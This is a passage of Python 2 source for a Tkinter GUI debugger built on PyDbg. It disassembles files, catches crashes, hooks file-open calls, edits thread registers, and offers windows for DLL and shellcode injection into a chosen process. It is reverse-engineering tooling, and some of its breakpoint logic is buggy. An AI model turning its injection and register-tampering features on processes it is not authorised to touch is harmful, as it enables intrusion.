        length   = None
        try:
            code = open(filename, 'rb').read()
        except Exception as e:
            self.debug_print('Error reading file %s: %s' % (filename, e))
            return False
        old_stdout = sys.stdout
        sys.stdout = mystdout = StringIO()
        # Print each decoded instruction
        # This shows how to use the Deocode - Generator
        iterable = distorm3.DecodeGenerator(offset, code, dt)
        #for (offset, size, instruction, hexdump) in iterable:
        #    self.debug_print("%.8x: %-32s %s" % (offset, hexdump, instruction))
        #    print("%.8x: %-32s %s" % (offset, hexdump, instruction))

        # It could also be used as a returned list:
        l = distorm3.Decode(offset, code, dt)
        for (offset, size, instruction, hexdump) in l:
             print("%.8x: %-32s %s" % (offset, hexdump, instruction))
        
        line = mystdout.getvalue()
        self.textPad.insert('1.0', line)
        #self.debug_print(line)
        self.debug_print("Number of bytes disassembled: %d" % num_bytes)
        self.debug_print("Disassembled:%s" % self.OPEN)
        self.nocolor = True
        self.highlighter()
        #t = threading.Thread(target=self.highlighter)
        #t.daemon = True
        #t.start()

    def RepresentsInt(self, s):
        try: 
            int(s)
            return True
        except ValueError:
            return False

    def CrashDebug(self, pid):
        print "Starting..."
        #old_stdout = sys.stdout
        #sys.stdout = mystdout = StringIO()
        # Utility libraries included with PyDbg
        # This is our access violation handler
        def check_accessv(dbg):
        # We skip first-chance exceptions
            if dbg.dbg.u.Exception.dwFirstChance:
                return DBG_EXCEPTION_NOT_HANDLED

            crash_bin = utils.crash_binning.crash_binning()
            crash_bin.record_crash(dbg)
            self.debug_print(crash_bin.crash_synopsis())
            dbg.terminate_process()
            return DBG_EXCEPTION_NOT_HANDLED
        
        if not self.RepresentsInt(pid):
            dbg.load(self.OPEN)
        else:
            dbg.attach(int(pid))
        self.get_dlls()
        dbg.set_callback(EXCEPTION_ACCESS_VIOLATION,check_accessv)
        self.breakpointset("pydbg")
        dbg.run()
        #line = mystdout.getvalue()
        #self.debug_print(line)
        self.crash = True
        
    def GetLib(self, pid):
        target_process = pid
        pid_is_there = False
        self.debug_print("[*]Starting...")
        def handler_CreateFileW(dbg):
            Filename = ""
            addr_FilePointer = dbg.read_process_memory(dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            Filename = dbg.smart_dereference(addr_FilePointer, True)
            self.debug_print("[*]CreateFileW -> %s" % Filename)
            return DBG_CONTINUE
        def handler_CreateFileA(dbg):
            offset = 0
            buffer_FileA = ""
            addr_FilePointer = dbg.read_process_memory(dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            buffer_FileA = dbg.smart_dereference(addr_FilePointer, True)
            self.debug_print("[*]CreateFileA -> %s" % buffer_FileA)
            return DBG_CONTINUE
        pid_is_there = True
        self.debug_print("[*]Attaching to %s" % target_process)
        if not self.RepresentsInt(pid):
            try:
                dbg.load(self.OPEN)
            except:
                self.debug_print("[*]Error: Is this right:%s" % self.OPEN)
        else:
            dbg.attach(int(pid))
        self.get_dlls()
        function2 = "CreateFileW"
        function3 = "CreateFileA"
        CreateFileW = dbg.func_resolve_debuggee("kernel32.dll","CreateFileW")
        CreateFileA = dbg.func_resolve_debuggee("kernel32.dll","CreateFileA")
        if CreateFileW == None:
            try:
                self.debug_print("[*]Resolving %s @ %08x" % (function2,CreateFileW))
            except:
                self.debug_print("[*]Resolving %s @ Unknown" % (function2))
        if CreateFileA == None:
            try:
                self.debug_print("[*]Resolving %s @ %08x" % (function3,CreateFileA))
            except:
                self.debug_print("[*]Resolving %s @ Unknown" % (function2))
        if CreateFileA == None:
            dbg.bp_set(CreateFileA, description="CreateFileA",handler=handler_CreateFileA)
        if CreateFileW == None:
            dbg.bp_set(CreateFileW, description="CreateFileW",handler=handler_CreateFileW)
        self.breakpointset("pydbg")
        dbg.debug_event_loop()
        self.highlighter()
                           
    def detach2(self):
        if (self.PID == None):
            dbg.detach()
            self.debug_print("Detached!!!")
        elif (self.open_state == None):
            dbg.detach()
            self.debug_print("Detached!!!")
        else:
            label = tkMessageBox.showinfo("Error", "You must attach or open a .exe first")
    
    def onExit(self):
        self.parent.destroy()

    def about_command(self):
        label = tkMessageBox.showinfo("About", "Python debugger \nGUI [Version %.1f] \nSee the GitHub repo for instructions" % version)
                
    def clear(self):
            self.textPad.delete(1.0, 'end-1c')

    def popupPID(self):
        self.w=popupWindowPID(self.master)
        self.master.wait_window(self.w.top)
        self.PID = self.w.value
        self.debug_print("Using PID of %s" % self.PID)
        
    def popupOPEN2(self):
        self.file = tkFileDialog.askopenfile(mode='r',title='Select an executable',filetypes=[("Executable Files", "*.exe")] )
        self.OPEN = self.file.name
        self.open_state = True
        self.debug_print("Application:%s" % self.OPEN)

    def popupOPEN(self):
        self.w=popupWindowOPEN(self.master)
        self.master.wait_window(self.w.top)
        self.OPEN = self.w.value
        self.OPEN.strip()
        self.OPEN.strip("")
        self.OPEN.strip("\r")
        self.open_state = True
        self.debug_print("Application:%s" % self.OPEN)

    def popupEVENT1(self):
        t = threading.Thread(target=popupWindowEVENT(self.master))
        t.daemon = True
        t.start()

    def popupEVENTS(self):
        self.w=popupWindowEVENT(self.master)
        self.master.wait_window(self.w.top)

    def popupTHREAD(self):
        if self.PID == self.OPEN:
            self.debug_print("[-] You must open or attach first...")
            return False
        i = 0;
        for thread_id in dbg.enumerate_threads():
            thread_handle  = dbg.open_thread(thread_id)
            context = dbg.get_thread_context(thread_handle)
            self.debug_print("[*] Dumping registers for threads:")
            self.debug_print("[**] Thread ID:%03d: %08x EIP: %08x" % (i,thread_handle,context.Eip))
            self.debug_print("[**] Thread ID:%03d:: %08x ESP: %08x" % (i,thread_handle,context.Esp))
            self.debug_print("[**] Thread ID:%03d:: %08x EBP: %08x" % (i,thread_handle,context.Ebp))
            self.debug_print("[**] Thread ID:%03d:: %08x EAX: %08x" % (i,thread_handle,context.Eax))
            self.debug_print("[**] Thread ID:%03d:: %08x EBX: %08x" % (i,thread_handle,context.Ebx))
            self.debug_print("[**] Thread ID:%03d:: %08x ECX: %08x" % (i,thread_handle,context.Ecx))
            self.debug_print("[**] Thread ID:%03d:: %08x EDX: %08x" % (i,thread_handle,context.Edx))
            i += 1
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.debug_print(synopsis)
            
    def export(self):
        data = self.textPad.get(1.0, 'end-1c').encode('utf-8')
        if self.PID is None:
            line = "Debugger-Data-%s.txt" % (os.path.basename(os.path.normpath(self.OPEN)))
            file = open(line, "w")
            file.write(data)
            file.close()
            self.debug_print("Exported to '%s'" % line)
        elif self.OPEN is None:
            line = "Debugger-Data-%s.txt" % self.PID
            file = open(line, "w")
            file.write(data)
            file.close()
            self.debug_print("Exported to '%s'" % line)
        else:
            line = "Debugger-Data-for-who-knows-what.txt"
            file = open(line, "w")
            file.write(data)
            file.close()
            self.debug_print("Exported to '%s'" % line)

    def entryValue(self):
        return self.w.value

    def start(self):
        if self.breakmode:
            self.pause = False
            self.breakmode = False
            return True
        if self.lib_mode_state:
            self.InitPyDBG()
            if self.open_state:
                self.debug_print("[-]Unable to set breakpoints with 'open' method, try attaching")
                data = "%s" % self.OPEN
                t = threading.Thread(target=self.GetLib, args=(data,))
                t.daemon = True
                t.start()
                return True
            else:
                data = "%s" % self.PID
                t = threading.Thread(target=self.GetLib, args=(data,))
                t.daemon = True
                t.start()
                return True
        if self.crash_mode_state:
            self.InitPyDBG()
            if self.open_state:
                data = "%s" % self.OPEN
                t = threading.Thread(target=self.CrashDebug, args=(data,))
                t.daemon = True
                t.start()
                return True
            else:
                print "Crash mode [DEBUG]"
                data = "%s" % self.PID
                print data
                t = threading.Thread(target=self.CrashDebug, args=(data,))
                t.daemon = True
                t.start()
                print "New Thread Started..."
                return True
        elif self.open_state:
            self.InitPyDBG()
            t = threading.Thread(target=self.load, args=(self.OPEN,))
            t.daemon = True
            t.start()
            return True
        else:
            m = self.check()
            if (m == False):
                return False
            print "TMP TMP TMP TMP"
            self.InitPyDBG()
            t = threading.Thread(target=self.debug)
            t.daemon = True
            t.start()
            return True

    def open(self):
        self.location = tkFileDialog.askopenfile(mode='rb',title='Select a file')
        self.load(self.location.name)

    def screen(self, text):
        self.textPad.insert('1.0', text)
        return True

    def check(self):
        if (self.PID is None)&(self.OPEN is None):
            label = tkMessageBox.showinfo("Error", "You must attach first")
            return False
        else:
            num = 1
            
    def debug(self):
        if self.PID is None:
            label = tkMessageBox.showinfo("Error", "You must open an executable first")
            return False
        dbg.attach(int(self.PID))
        self.get_dlls()
        self.breakpointset("pydbg")
        dbg.run()
                
    def load(self,path_to_exe):
        if self.OPEN is None:
            label = tkMessageBox.showinfo("Error", "You must open an executable first")
            return False
        dbg.load(self.OPEN)
        self.get_dlls()
        self.breakpointset("pydbg")
        dbg.run()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

class popupWindowPID(object):
    
    def __init__(self,master):
        print "[*]PID window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="PID")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()


    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]Destroying PID window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]Added PID: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowEVENT(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("320x135+300+300")
        self.l=Label(top,text="0x1 EXCEPTION_DEBUG_EVENT         u.Exception\n0x2 CREATE_THREAD_DEBUG_EVENT       u.CreateThread\n0x3 CREATE_PROCESS_DEBUG_EVENT       u.CreateProcessInfo\n0x4 EXIT_THREAD_DEBUG_EVENT         u.ExitThread\n0x5 EXIT_PROCESS_DEBUG_EVENT       u.ExitProcess\n0x6 LOAD_DLL_DEBUG_EVENT          u.LoadDll\n0x7 UNLOAD_DLL_DEBUG_EVENT        u.UnloadDll\n0x8 OUPUT_DEBUG_STRING_EVENT        u.DebugString\n0x9 RIP_EVENT         u.RipInfo")
        self.l.pack()
        #self.e=Entry(top)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()
        #self.textPad2 = ScrolledText(self)
        #self.textPad2.grid(row=1, column=0, columnspan=2, rowspan=4, padx=5, sticky=E+W+S+N)
        #self.textpad2.pack()
        
    def cleanup(self):
        self.value=self.e.get()
        self.top.destroy()

class popupWindowOPEN(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="Executable")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass
        
    def cleanup(self):
        self.value=self.e.get()
        self.top.destroy()

    def clip(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    
class popupWindowDLL(object):
    
    def __init__(self,master):
        print "[*]PID window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="DLL to inject")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]Destroying PID window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]Added PID: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowDLL2(object):
    
    def __init__(self,master):
        print "[*] Injection window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="               PID to inject into\n(Leave blank for debug process)")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "\t[*] Destroying injection window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+] Added PID: %s" % self.value
        print "[*] Hit Start or select  a different engine from the debug menu"

class popupWindowDIR(object):
    
    def __init__(self,master):
        print "[*]Dir window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x100+300+300")
        self.l=Label(top,text="Extra dir to monitor\n(tmp dirs are pre-included)\n(leave blank if you have none)")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying DIR window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded Dir: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowINJECT(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("300x200+300+300")
        self.l=Label(top,text="Shellcode:")
        self.l.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack(side="right")
        #self.e=Entry(top)
        self.e = ScrolledText(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Shellcode window(If you entered nothing, expect an error)"
        self.value=data = self.e.get(1.0, 'end-1c')
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowCHANGE(object):
    
    def __init__(self, master):
        top=self.top=Toplevel(master)
        self.top.geometry("300x200+300+300")
        acts = ['EAX', 'EBX', 'ECX', 'EDX', 'ESI', 'EDI', 'ESP', 'EBP', 'EIP']
        lb = Listbox(top)
        for i in acts:
            lb.insert(END, i) 
        lb.bind("<<ListboxSelect>>", self.onSelect)
        lb.pack(side="right")
        self.var = StringVar()
        self.var.set(None)
        self.l=Label(top,text="Value:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.L=Label(top,text="Thread:")
        self.L.pack()
        self.E=Entry(top)
        self.E.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #self.e.bind('<Button-3>',self.rClicker, add='')
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Register window(If you entered nothing, expect an error)"
        self.value1=data = self.e.get()
        print "[+]\t\tAdded[%s]: %s" % (self.value, self.value1)
        self.reg_set(self.value, self.value1)
        print "[*]Hit Start or select  a different engine from the debug menu"
        self.top.destroy()

    def reg_set(self, register, content):
        dbg.suspend_all_threads()
        try:
            #content = int(content, 0)
            content = int(content, 16)
        except:
            label = tkMessageBox.showinfo("Error", "Not a valid address:%s" % content)
        if register == "EAX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Eax = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EAX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Eax))
            dbg.resume_all_threads()
        elif register == "EBX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ebx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EBX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ebx))
            dbg.resume_all_threads()
        elif register == "ECX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ecx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ECX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ecx))
            dbg.resume_all_threads()
        elif register == "EDX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Edx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EDX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Edx))
            dbg.resume_all_threads()
        elif register == "ESI":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Esi = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ESI value[Thread %s]: 0x%08x" % (thread_id, thread_context.Esi))
            dbg.resume_all_threads()
        elif register == "EDI":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Edi = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EDI value[Thread %s]: 0x%08x" % (thread_id, thread_context.Edi))
            dbg.resume_all_threads()
        elif register == "ESP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Esp = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ESP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Esp))
            dbg.resume_all_threads()
        elif register == "EBP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ebp = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EBP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ebp))
            dbg.resume_all_threads()
        elif register == "EIP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Eip = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EIP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Eip))
            dbg.resume_all_threads()
        else:
            print "[-] Error"       #This should never happen
        return True
        

    def onSelect(self, val):
        sender = val.widget
        idx = sender.curselection()
        self.value = sender.get(idx)   
        self.type = self.value
        self.var.set(self.value)

class popupWindowHEX(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="Blocksize:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.insert(0,1024)
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")
        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
